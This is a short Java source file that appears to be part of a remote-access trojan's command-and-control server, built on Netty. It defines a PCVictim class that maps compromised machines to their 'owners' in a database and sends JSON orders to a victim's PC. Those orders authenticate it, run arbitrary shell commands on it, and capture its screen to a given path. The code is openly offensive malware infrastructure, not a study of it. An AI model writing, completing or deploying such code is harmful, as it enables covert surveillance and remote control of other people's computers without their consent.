import io.netty.channel.ChannelHandlerContext;
import org.json.simple.JSONObject;

public class PCVictim extends Victim {

    PCVictim(ChannelHandlerContext context, String name) {
        this.context = context;
        this.name = name;
        this.owners = NettyServer.getDBManager().DBUsers.getOwnersByVictim(name);
    }

    void sendAuthPCVictim() {
        JSONObject query = new JSONObject();
        query.put("action", "auth.pcvictim");
        sendMessage(query);
    }

    void sendCmd(String command, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "cmd");
        query.put("command", command);
        query.put("owner", owner);
        sendMessage(query);
    }

    void sendTakeScreen(String path, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "take.screen");
        query.put("path", path);
        query.put("owner", owner);
        sendMessage(query);
    }



}
